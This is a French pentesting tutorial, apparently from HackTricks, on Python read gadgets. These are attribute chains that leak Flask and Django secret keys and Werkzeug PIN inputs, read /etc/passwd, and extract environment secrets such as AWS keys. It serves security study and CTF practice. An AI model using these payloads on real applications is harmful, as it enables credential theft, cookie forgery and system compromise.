# Gadgets de lecture internes de Python

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Différentes vulnérabilités, telles que [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ou [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), peuvent vous permettre de **lire des données internes de Python, sans toutefois permettre d’exécuter du code**. Par conséquent, un pentester devra tirer le meilleur parti de ces permissions de lecture afin d’**obtenir des privilèges sensibles et d’aggraver la vulnérabilité**.

### Flask - Lire la clé secrète

La page principale d’une application Flask contiendra probablement l’objet global **`app`**, dans lequel ce **secret est configuré**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce cas, il est possible d'accéder à cet objet en utilisant n'importe quel gadget permettant d'**accéder aux objets globaux** depuis la page [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Dans le cas où **la vulnérabilité se trouve dans un autre fichier Python**, vous avez besoin d'un gadget permettant de parcourir les fichiers afin d'atteindre le fichier principal, pour **accéder à l'objet global `app.secret_key`** et pouvoir [**escalate privileges** en connaissant cette clé](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload comme celui-ci [provenant de ce writeup](https://ctftime.org/writeup/36082) :
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Utilisez ce payload pour **lire `app.secret_key`**. Si le bug d’origine vous donne également une primitive d’écriture (par exemple, une pollution de classe), le même chemin peut être utilisé pour la remplacer et signer des cookies Flask plus privilégiés.

### Werkzeug - machine_id et node uuid

[**En utilisant ces payloads de ce writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) vous pourrez accéder au **machine_id** et au **uuid** node, qui sont les **bits privés** dont vous avez besoin pour [**générer le Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) et accéder à la console Python dans `/console` si le **debug mode est activé** :
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Notez que vous pouvez obtenir le **chemin local du serveur vers `app.py`** en générant une **erreur** sur la page web, ce qui vous **donnera le chemin**.

Si la vulnérabilité se trouve dans un autre fichier Python, consultez l’astuce Flask précédente pour accéder aux objets du fichier Python principal.

### Django - SECRET_KEY et module settings

L’objet de configuration de Django est mis en cache dans `sys.modules` une fois l’application démarrée. Avec uniquement des primitives de lecture, vous pouvez provoquer un leak de la **`SECRET_KEY`**, des clés de secours, des identifiants de base de données ou des salts de signature :
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si le gadget vulnérable se trouve dans un autre module, parcourez d’abord les variables globales :
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sont tout aussi précieux que le `SECRET_KEY` actuel : ils continuent de valider les anciennes valeurs signées pendant la rotation. Le leak de `SESSION_ENGINE` et de `SESSION_SERIALIZER` permet également de déterminer rapidement si l’impact se limite à la falsification de cookies ou s’il est plus important. Pour plus de détails sur l’impact web, consultez la [**page de pentesting Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets de chargement de modules - lire le code source et les fichiers

Les modules Python chargés conservent généralement un `__loader__`. Les loaders basés sur des fichiers exposent fréquemment `get_source()` et `get_data()`, qui sont des **primitives read-only** parfaites lorsque vous pouvez déjà atteindre un objet module, mais pas `open()` :
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ceci est très utile pour dumper des **modules de configuration, blueprints, fichiers d'aide ou routes cachées** et récupérer des clés API, des DSN, des chemins de flags ou des points d'entrée de gadgets supplémentaires.

Si vous disposez uniquement de l'énumération des sous-classes, recherchez le loader par nom au lieu de coder en dur un index :
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### globals de frame de generator / coroutine

Si vous pouvez créer ou atteindre un objet generator/coroutine, sa frame peut leak des globals **sans nécessiter de gadget `__globals__` de fonction**. Cela est utile contre les filters qui bloquent uniquement les noms dunder et oublient les attributs de frame tels que `gi_frame`, `ag_frame`, `cr_frame` ou `f_globals` :
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Une fois que vous avez les globals de la frame, continuez exactement comme avec les autres gadgets (`sys.modules`, les objets de configuration, `os.environ`, etc.). Les sandbox escapes récentes redécouvrent sans cesse cette technique, car `gi_frame` et `f_globals` ne sont pas des attributs dunder et survivent souvent aux deny-lists naïves.

### Variables d’environnement / cloud creds via les modules chargés

De nombreux jails importent encore `os` ou `sys` quelque part. Vous pouvez exploiter n’importe quelle fonction accessible `__init__.__globals__` pour pivoter vers le module `os` déjà importé et extraire les **variables d’environnement** contenant des API tokens, des cloud keys ou des flags :
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si l’index de la sous-classe est filtré, utilisez des loaders :
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Les variables d’environnement sont souvent les seuls secrets nécessaires pour passer de la lecture à la compromission complète (clés cloud IAM, URL de bases de données, clés de signature, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) permettait la **class pollution** via des requêtes de composants spécialement conçues. La définition d’un chemin de propriété tel que `__init__.__globals__` permettait à un attaquant d’atteindre les variables globales du module du composant ainsi que tous les modules importés (par exemple `settings`, `os`, `sys`). Il était alors possible de leak `SECRET_KEY`, `DATABASES` ou les identifiants de services sans exécution de code. La chaîne d’exploitation repose uniquement sur la lecture et utilise les mêmes modèles de dunder-gadgets que ci-dessus.

### Collections de gadgets pour le chaînage

Des CTF récents et les recherches sur les pyjails montrent des chaînes de lecture fiables construites uniquement avec l’accès aux attributs et l’énumération des sous-classes. Des listes maintenues par la communauté, comme [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), répertorient des centaines de gadgets minimaux que vous pouvez combiner pour parcourir les objets jusqu’à `__globals__`, `sys.modules`, puis aux données sensibles. Préférez les recherches basées sur les attributs/noms aux index bruts de sous-classes, car la position de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. change selon les versions de Python et les bibliothèques supplémentaires importées.

## Références

- [Documentation de Django sur la signature cryptographique](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – wiki des gadgets de sandbox Python](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
